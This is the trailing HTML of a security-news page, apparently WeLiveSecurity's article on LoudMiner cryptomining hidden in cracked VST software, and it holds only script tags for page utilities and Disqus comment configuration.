		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"127012 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=127012","disqusShortname":"welivesecurity","disqusTitle":"LoudMiner: Cross\u2011platform mining in cracked VST software","disqusUrl":"https:\/\/www.welivesecurity.com\/2019\/06\/20\/loudminer-mining-cracked-vst-software\/","postId":"127012"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>